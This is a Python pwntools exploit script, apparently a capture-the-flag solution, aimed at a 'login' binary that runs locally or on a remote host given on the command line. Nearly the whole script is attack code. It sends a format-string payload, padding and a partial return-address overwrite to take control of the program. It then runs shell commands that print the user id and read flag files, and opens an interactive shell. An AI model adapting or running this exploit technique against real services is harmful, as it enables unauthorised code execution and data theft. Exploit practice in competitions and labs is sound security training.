from pwn import *
import sys, os
import time

context.log_level = 'error'
log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./login"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name)#, aslr=False)#env={"LD_PRELOAD" : "./libc.so.6"})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass


#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

cmd = """
"""
do_debug (cmd)

0xfc5b97 +0x4f2c5-0x21B97
try :

  rr ()
#cs = "a]%264^1"
  cs = "a]%c%11$3c[b"
  r.sendline (str(len(cs)))
  rr ()
  r.send (cs)


  rr ()
  pay = "a"*0x4f 
  pay2 ="b"*264
  r.sendline (pay)
#4022c5
#f8a2c5
#r.sendline ("\xc5\x22\x40")
  r.sendline ("\xc5\xa2\xf8")

  r.sendline (pay2)

  pay = "a" * 0x4f 
  r.send(pay)

  r.sendline ("/usr/bin/id")
  r.sendline ("/usr/bin/id")
  r.sendline ("/usr/bin/id")
  r.sendline ("/bin/cat /home/*/flag")
  r.sendline ("/bin/cat flag")
  r.sendline ("/bin/cat /flag")

  r.interactive ()

except:
  r.close ()
